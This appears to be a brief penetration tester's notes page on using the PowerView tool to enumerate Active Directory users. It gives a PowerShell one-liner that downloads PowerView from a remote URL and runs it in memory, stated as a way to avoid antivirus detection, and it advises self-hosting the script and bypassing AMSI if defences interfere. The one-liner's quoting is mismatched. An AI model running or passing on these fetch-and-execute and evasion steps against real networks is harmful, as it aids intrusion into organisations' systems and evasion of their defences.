# Updates:

| date | name | description | comment | link |
| --- | --- | --- | --- | --- |
| 07/2020 | PowerView | Different tools for enumaration in Active Directory | Active Directory | [PowerView](#PowerView) |


# PowerView

## Using PowerView: 

cheatsheet: https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview

## Load into memory from remote (to avoid AV detection):

> iex ((New-Object System.Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"))```
  
**NOTE:** if AV detects the URL, then just host it somewhere on your own
    
## Use something like this syntax:

> Get-NetUser -Filter "(title=Test Developer Junior)" | select name,samaccountname,title,manager

## Avoiding Antivirus:

In case AV prevents executing PowerShell scripts, try to bypass AMSI (https://www.youtube.com/watch?v=yHstFvLwDYM)

---
